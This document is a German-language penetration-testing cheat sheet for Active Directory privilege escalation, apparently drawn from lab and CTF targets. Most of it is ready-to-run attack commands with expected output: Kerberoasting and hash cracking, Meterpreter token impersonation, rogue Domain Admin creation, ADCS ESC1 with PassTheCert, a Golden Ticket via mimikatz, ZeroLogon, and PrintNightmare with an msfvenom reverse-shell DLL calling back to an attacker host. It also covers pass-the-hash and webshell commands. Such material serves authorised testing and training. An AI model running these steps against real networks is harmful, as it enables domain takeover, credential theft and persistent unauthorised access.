# Privilege Escalation

## Ziel der Privilege Escalation Phase

- Erhöhung von Standard-User zu Local Admin
- Erhöhung von Local Admin zu Domain Admin
- Exploitation von Fehlkonfigurationen und Schwachstellen
- Erlangung von Domain Controller Zugriff
- Kompromittierung hochprivilegierter Service Accounts

---

## Kerberoasting

### SPN Enumeration und Ticket Request


```bash
# SPNs abfragen und TGS-Tickets anfordern
impacket-GetUserSPNs MARVEL.local/mmustermann:Password1 -dc-ip 192.168.xx.x -request

# Alternative Syntax
GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 10.10.10.225 -request
```

**Prozess:**

1. Active Directory nach Service Principal Names durchsuchen
2. TGS-Tickets für jeden SPN anfordern
3. Verschlüsselte Hashes für Offline-Cracking extrahieren

### Kerberoast Hash speichern


```bash
# Hash in Datei speichern
echo '$krb5tgs$23$*SQLService$MARVEL.LOCAL$MARVEL.local/SQLService*$54e...' > kerb_hashes.txt
```

### Kerberoast Hash Cracking


```bash
# Hashcat mit Kerberos-Modus
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Beispiel-Ergebnis:**

- Service: SQLService (SQL Server Account)
- Password: Mypassword123#
- Privileges: Oft Domain Admin Level

---

## Token Impersonation

### Incognito Extension Setup


```bash
# In Meterpreter Session
load incognito

# Verfügbare Extensions anzeigen
load -l

# Hilfe anzeigen
help
```

### Token Discovery


```bash
# User Delegation Tokens anzeigen
list_tokens -u
```

**Erwartete Tokens:**

- `MARVEL\mmustermann` (Domain User)
- `NT-AUTHORITY\SYSTEM` (Local System)
- Verschiedene Service Accounts

### Domain User Token Impersonation


```bash
# Token impersonieren (doppelte Backslashes erforderlich!)
impersonate_token marvel\\\\mmustermann

# Verifizierung
shell
whoami
exit
```

### Zurück zu Original Identity


```bash
# Impersonation zurücksetzen
rev2self

# User ID prüfen
getuid
```

### Domain Administrator Token Impersonation

_Nach Admin-Login auf Target System:_


```bash
# Tokens erneut auflisten
list_tokens -u

# Administrator Token impersonieren
impersonate_token marvel\\\\administrator

# Verifizierung
shell
whoami
```

### Domain Compromise via Token

cmd

```cmd
# Domain User erstellen
net user /add hawkeye Password1@ /domain

# Zu Domain Admins hinzufügen (Deutsch)
net group "Domanen-Admins" hawkeye /ADD /DOMAIN

# Zu Domain Admins hinzufügen (Englisch)
net group "Domain Admins" hawkeye /ADD /DOMAIN
```

### Verification


```bash
# Neues Terminal auf Kali
impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.xx.x
```

**Erfolg zeigt:**

- Komplette NTDS.dit Extraktion
- krbtgt Account Hash
- Alle Domain User Hashes

---

## NFS UID Spoofing

### Ziel-User UID ermitteln


```bash
# UID des Ziel-Users identifizieren
id peter.turner@hybrid.vl
# Ausgabe: uid=902601108
```

### Lokalen User mit identischer UID erstellen


```bash
# User mit gleicher UID erstellen
useradd --badname -u 902601108 peter.turner@hybrid.vl
```

### SUID Bash Deployment


```bash
# Bash nach NFS-Share kopieren
cp /bin/bash /opt/share/

# SUID Bit setzen (als Root via NFS Mount)
chmod +s /mnt/tmpmnt/bash
```

### Privileged Shell


```bash
# Bash mit Privilege-Preservation
/opt/share/bash -p

# Verifizierung
whoami
```

---

## ADCS ESC1 Exploitation

### Certificate Services Enumeration


```bash
# Vulnerable Templates finden
certipy-ad find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -dc-ip 10.10.175.181 -vulnerable
```

**Typisches Vulnerable Template:**

- Template: HybridComputers (ESC1)
- Allows SAN (Subject Alternative Name)
- Enrollable by Machine Accounts

### Machine Account Credential Extraction


```bash
# NTLM Hash aus Keytab extrahieren
python3 keytabextract.py krb5.keytab
# Output: NTLM: 0f916c5246fdbc7ba95dcef4126d57bd
```

### Certificate Request als Machine Account


```bash
# Certificate mit Administrator UPN anfordern
certipy-ad req -u 'MAIL01$' -hashes :0f916c5246fdbc7ba95dcef4126d57bd -ca hybrid-DC01-CA -target 10.10.175.181 -template HybridComputers -upn administrator@hybrid.vl -key-size 4096
```

**Parameter:**

- `-u 'MAIL01$'` = Machine Account
- `-hashes :HASH` = NT Hash des Machine Accounts
- `-ca` = Certificate Authority Name
- `-template` = Vulnerable Template
- `-upn` = User Principal Name (Administrator!)
- `-key-size 4096` = Key Size

### PassTheCert Attack


```bash
# Administrator Passwort via Certificate ändern
python3 passthecert.py -action modify_user -crt admin.crt -key admin.key -domain hybrid.vl -dc-ip 10.10.175.181 -target administrator -new-pass Password123!
```

### Domain Admin Access


```bash
# Mit neuem Passwort einloggen
evil-winrm -i 10.10.175.181 -u administrator -p 'Password123!'

# Verifizierung
whoami
```

---

## Child-to-Parent Domain Escalation

### Trust Relationship Discovery

#### PowerShell Enumeration

powershell

```powershell
# In Evil-WinRM oder lokalem PowerShell
Get-ADTrust -Filter *
```

#### LDAP Trust Enumeration


```bash
# Trust Relationships via ldeep
ldeep ldap -u harry -p 'haxxor@12345' -d lab.trusted.vl -s ldap://10.10.255.70 trusts
```

### Domain SID Reconnaissance


```bash
# Child Domain SID ermitteln
lookupsid.py lab.trusted.vl/harry:'haxxor@12345'@10.10.255.70
```

**Wichtige SIDs notieren:**

- Child Domain SID: S-1-5-21-...
- Parent Domain SID: S-1-5-21-...

### DNS Configuration (Kritisch!)


```bash
# Beide Domains müssen in /etc/hosts
echo "10.10.255.70 lab.trusted.vl labdc.lab.trusted.vl" | sudo tee -a /etc/hosts
echo "10.10.255.69 trusted.vl trusteddc.trusted.vl" | sudo tee -a /etc/hosts
```

### Automated raiseChild Attack


```bash
# Automatische Child-to-Parent Escalation
raiseChild.py lab.trusted.vl/cpowers -hashes :322db798a55f85f09b3d61b976a13c43
```

**Prozess:**

1. Child Domain krbtgt Hash extrahieren
2. Trust Key ermitteln
3. Inter-Realm TGT erstellen
4. Enterprise Admins SID in SID-History injizieren
5. Parent Domain kompromittieren

### Parent Domain Compromise


```bash
# NTDS.dit der Parent Domain dumpen
secretsdump.py -hashes :15db914be1e6a896e7692f608a9d72ef trusted.vl/Administrator@10.10.255.69

# Shell auf Parent DC
evil-winrm -i 10.10.255.69 -u Administrator -H 15db914be1e6a896e7692f608a9d72ef
```

---

## Golden Ticket Attack

### Voraussetzungen

- krbtgt Account Hash
- Domain SID
- Domain Controller Zugriff (für Hash-Extraktion)

### Auf Domain Controller (Windows)

#### Mimikatz starten

cmd

```cmd
mimikatz.exe
```

#### Debug-Privilegien aktivieren

mimikatz

```mimikatz
privilege::debug
```

**Erwartete Ausgabe:** `Privilege '20' OK`

#### Kerberos Ticket Informationen extrahieren

mimikatz

```mimikatz
lsadump::lsa /inject /name:krbtgt
```

**Zu kopieren:**

- Domain SID (z.B. S-1-5-21-1234567890-1111111111-2222222222)
- krbtgt NTLM Hash

#### Golden Ticket erstellen

mimikatz

```mimikatz
# Generisches Template
kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-... /krbtgt:HASH_HIER /id:500 /ptt

# Beispiel mit fiktivem User
kerberos::golden /User:Batman /domain:marvel.local /sid:S-1-5-21-1234567890-1111111111-2222222222 /krbtgt:8A1B2C3D4E... /id:500 /ptt
```

**Parameter-Erklärung:**

|Parameter|Bedeutung|Beispiel|
|---|---|---|
|`/User:`|Benutzername (kann fiktiv sein)|`Administrator` oder `Batman`|
|`/domain:`|FQDN der Domain|`marvel.local`|
|`/sid:`|Domain SID|`S-1-5-21-...`|
|`/krbtgt:`|NTLM Hash des krbtgt Accounts|Hash aus `lsadump::lsa`|
|`/id:`|RID des Users|`500` (Administrator)|
|`/ptt`|Pass The Ticket (sofort injizieren)|-|

#### CMD mit Golden Ticket öffnen

mimikatz

```mimikatz
misc::cmd
```

**Golden Ticket Eigenschaften:**

- Kann auf 10 Jahre Gültigkeit konfiguriert werden
- Funktioniert nur mit krbtgt Hash
- Schwer zu erkennen (kein realer Logon)
- RID 500 = immer Administrator
- Funktioniert auch mit nicht-existierenden Usernamen

---

## ZeroLogon (CVE-2020-1472)

### Vulnerability Check


```bash
# Anfälligkeit testen (ohne Exploit)
python3 zerologon_tester.py DC-NAME DC-IP

# Beispiel
python3 zerologon_tester.py ODIN-DC 192.168.xx.x
```

### ZeroLogon Exploitation


````bash
# Machine Account Passwort auf NULL setzen
python3 cve-2020-1472-exploit.py DC-NAME DC-IP

# Beispiel
python3 cve-2020-1472-exploit.py ODIN-DC 192.168.xx.x
```

**Erwartete Ausgabe:**
```
Performing authentication attempts...
Success! DC machine account password nullified
Target is now compromised
````

### Credential Extraction nach ZeroLogon


```bash
# Domain Credentials mit nullified Machine Account extrahieren
impacket-secretsdump -just-dc domain.local/'DC-NAME$'@DC-IP -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# Beispiel
impacket-secretsdump -just-dc MARVEL.local/'ODIN-DC$'@192.168.xx.x -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

**Extrahiert:**

- Alle Domain User Hashes
- Administrator Account Hash
- krbtgt Account Hash
- Machine Account Credentials

### Domain Controller Restoration (KRITISCH!)


````bash
# Schritt 1: Original Machine Account Hash aus secretsdump Output extrahieren
# Suchen nach: ODIN-DC$:aad3b435b51404eeaad3b435b51404ee:ORIGINAL_HASH

# Schritt 2: Original Passwort wiederherstellen
python3 restorepassword.py domain.local/DC-NAME@DC-NAME -target-ip DC-IP -hexpass ORIGINAL_HEX_PASSWORD

# Beispiel
python3 restorepassword.py MARVEL.local/ODIN-DC@ODIN-DC -target-ip 192.168.xx.x -hexpass [EXTRACTED_HEX_PASSWORD]
```

**Restoration-Prozess:**
1. Original Machine Account Hash aus secretsdump extrahieren
2. NTLM Hash zu Hex-Format konvertieren
3. restorepassword.py mit Original-Passwort ausführen
4. DC-Funktionalität verifizieren

### Professional Pentest Approach
```
⚠️ EMPFOHLENER ANSATZ:
1. Anfälligkeit mit zerologon_tester.py testen
2. Dokumentieren dass ZeroLogon möglich ist
3. KEINEN Exploit ausführen
4. Finding mit Remediation Steps reporten
5. Potentielle DC-Zerstörung vermeiden
````

---

## PrintNightmare (CVE-2021-1675)

### Vulnerability Assessment


````bash
# Print Spooler Services prüfen
impacket-rpcdump @192.168.xx.x | egrep 'MS-RPRN|MS-PAR'
```

**Erwartete vulnerable Ausgabe:**
```
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol
````

### Modified Impacket Installation


```bash
# Original Impacket entfernen
pip3 uninstall impacket

# cube0x0's modifizierte Version installieren
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

### Exploit Download


```bash
# Exploit-Datei erstellen
mousepad CVE-2021-1675.py
# Raw Code von GitHub einfügen: https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py
```

### Payload Generation


```bash
# Malicious DLL erstellen
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.xx.x LPORT=7777 -f dll > shell.dll
```

**Payload-Parameter:**

- LHOST: Angreifer IP
- LPORT: Listening Port
- Format: DLL für Print Spooler Injection

### Metasploit Listener Setup


```bash
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.xx.x
set LPORT 7777
options
run
```

### SMB Server für Payload Hosting


```bash
# SMB-Server im Payload-Verzeichnis starten
smbserver.py share $(pwd) -smb2support
```

**Server-Konfiguration:**

- Share Name: share
- Directory: Current Working Directory
- Protocol: SMB2 Support aktiviert

### PrintNightmare Exploitation


````bash
# Exploit ausführen
python3 CVE-2021-1675.py marvel.local/mmustermann:Password1@192.168.xx.x '\\192.168.xx.x\share\shell.dll'

# Alternative Targets
python3 CVE-2021-1675.py marvel.local/mmustermann:Password1@192.168.xx.x '\\192.168.xx.x\share\shell.dll'
python3 CVE-2021-1675.py marvel.local/mmustermann:Password1@192.168.xx.x '\\192.168.xx.x\share\shell.dll'
```

**Command-Breakdown:**
- Target: Workstation/DC IP
- Credentials: Domain User Credentials
- Payload Path: UNC Path zur malicious DLL

### Erfolgreiche Exploitation
```
[*] Sending stage (200262 bytes) to TARGET_IP
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Fehlgeschlagene Exploitation (Gepatcht)
```
[!] Error: Access denied
[!] Target appears to be patched against PrintNightmare
[!] Spooler service running but exploit failed
````

---

## Pass-the-Hash Privilege Escalation

### CrackMapExec PTH


```bash
# Netzwerk-weiter Pass-the-Hash
crackmapexec smb 192.168.xx.x/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
```

**Ergebnis-Indikatoren:**

- `[+]` = Erfolgreiche Auth
- `Pwn3d!` = Administrative Privilegien auf System

### Impacket PTH für Shell


```bash
# PSExec mit Hash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f Administrator@192.168.xx.x

# WMIExec mit Hash
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f Administrator@192.168.xx.x

# Evil-WinRM mit Hash
evil-winrm -i 10.10.255.69 -u Administrator -H 15db914be1e6a896e7692f608a9d72ef
```

---

## Web-basierte Privilege Escalation

### Via Webshell zu Domain Admin


```bash
# Domain User erstellen
curl "http://10.10.255.70/dev/back.php?c=net%20user%20harry%20haxxor@12345%20/add%20/domain"

# Zu lokalen Admins hinzufügen
curl "http://10.10.255.70/dev/back.php?c=net%20localgroup%20Administrators%20harry%20/add%20/domain"
```

### Via Evil-WinRM zu Domain Admins

cmd

```cmd
# In Evil-WinRM Session
net group "Domain Admins" harry /add /domain
```

---

## BloodHound Attack Path Analysis

### Pre-built Queries für Privilege Escalation


```cypher
# Kerberoastable Users
MATCH (u:User) WHERE u.hasspn=true RETURN u

# Computers mit Unconstrained Delegation
MATCH (c:Computer) WHERE c.unconstraineddelegation=true RETURN c

# Shortest Path zu Domain Admins
# In GUI: Pathfinding Tab
# Start Node: mmustermann@MARVEL.LOCAL
# End Node: DOMAIN ADMINS@MARVEL.LOCAL
```

---

## 3-Phasen Post-Compromise Strategie

### Phase 1: Quick Wins (Standard User Rights)

- **Kerberoasting** - Service Account Hash Extraktion
- **Password Spraying** - Bekannte Passwörter gegen alle User testen
- **SMB Share Enumeration** - Sensible Files suchen

### Phase 2: System Exploitation (Admin Rights Required)

- **Secretsdump** - Alle lokalen Credentials extrahieren
- **Mimikatz** - Live Memory Credential Harvesting
- **Pass-the-Hash** - Lateral Movement mit extrahierten Hashes

### Phase 3: Deep Dive (When Standard Methods Fail)

- **BloodHound** - Attack Path Visualisierung
- **Legacy Exploits** - MS17-010, PrintNightmare, ZeroLogon
- **Creative Vectors** - Certificate Attacks, DNS Manipulation

---

## Typische Privilege Escalation Pfade

### Standard User → Local Admin

- Kerberoasting → Service Account Compromise
- NFS UID Spoofing → File System Access
- Web Exploitation → Webshell → Local Admin Group

### Local Admin → Domain Admin

- Token Impersonation → Domain Admin Token
- Secretsdump → Hash Extraction → PTH
- LSA Secrets → Cached Domain Credentials

### Domain User → Domain Admin

- ADCS ESC1 → Certificate → PassTheCert
- Child Domain Admin → raiseChild → Parent Domain Admin
- ZeroLogon → DC Compromise → NTDS.dit

---

## Troubleshooting

### Kerberoasting Issues


```bash
# Wenn keine SPNs gefunden:
# 1. Domain Credentials korrekt
# 2. DC erreichbar via Port 88 (Kerberos)
# 3. User hat tatsächlich SPNs

# Manuell SPNs prüfen
ldapsearch -H ldap://DC-IP -x -b "DC=domain,DC=local" "(servicePrincipalName=*)"
```

### Token Impersonation Issues


```bash
# Wenn Tokens nicht verfügbar:
# 1. SYSTEM Privilegien auf Target
# 2. Administrator hat sich eingeloggt
# 3. Incognito korrekt geladen

# In Meterpreter
getuid  # Sollte NT AUTHORITY\SYSTEM sein
load incognito
list_tokens -u
```

### ADCS ESC1 Issues


```bash
# Wenn Certificate Request fehlschlägt:
# 1. Template tatsächlich vulnerable
# 2. Machine Account Credentials korrekt
# 3. CA erreichbar
# 4. Enrollment Rights vorhanden

# Certipy Debug
certipy-ad req -u 'MACHINE$' -hashes :HASH -ca CA-NAME -target DC-IP -template TEMPLATE -debug
```

### Child-to-Parent Issues


```bash
# Wenn raiseChild fehlschlägt:
# 1. DNS für beide Domains konfiguriert
# 2. Trust Relationship existiert
# 3. Child Domain Admin Credentials
# 4. Network Connectivity zu beiden DCs

# DNS testen
nslookup lab.trusted.vl
nslookup trusted.vl
```

---

## Success Indicators

### Kerberoasting Success

- ✅ SPNs gefunden und Tickets extrahiert
- ✅ Hash erfolgreich gecrackt
- ✅ Service Account hat hohe Privilegien
- ✅ Credentials funktionieren für Lateral Movement

### Token Impersonation Success

- ✅ Administrator Token verfügbar
- ✅ Domain Commands funktionieren
- ✅ `net user /domain` gibt Results
- ✅ Domain Admin Gruppe manipulierbar

### ADCS ESC1 Success

- ✅ Vulnerable Template identifiziert
- ✅ Certificate mit Administrator UPN erhalten
- ✅ PassTheCert erfolgreich
- ✅ Administrator Passwort geändert

### Child-to-Parent Success

- ✅ Trust Relationship identifiziert
- ✅ raiseChild erfolgreich ausgeführt
- ✅ Parent Domain NTDS.dit extrahiert
- ✅ Enterprise Admin Zugriff erhalten

### Domain Compromise Success

- ✅ NTDS.dit vollständig gedumpt
- ✅ krbtgt Hash für Golden Tickets
- ✅ Alle Domain User Hashes
- ✅ Zugriff auf alle Systeme

---

## Credentials & Hashes Summary

### Typische Hash-Formate

|Hash-Typ|Hashcat Mode|Verwendung|
|---|---|---|
|NetNTLMv2|5600|Responder Captures|
|NTLM|1000|SAM/NTDS Dumps|
|Kerberos TGS|13100|Kerberoasting|

### Kritische Accounts

- **krbtgt** - Golden Ticket Attacks
- **Administrator** - Full Domain Control
- **Service Accounts mit SPNs** - Kerberoasting Targets
- **Machine Accounts** - Certificate Enrollment
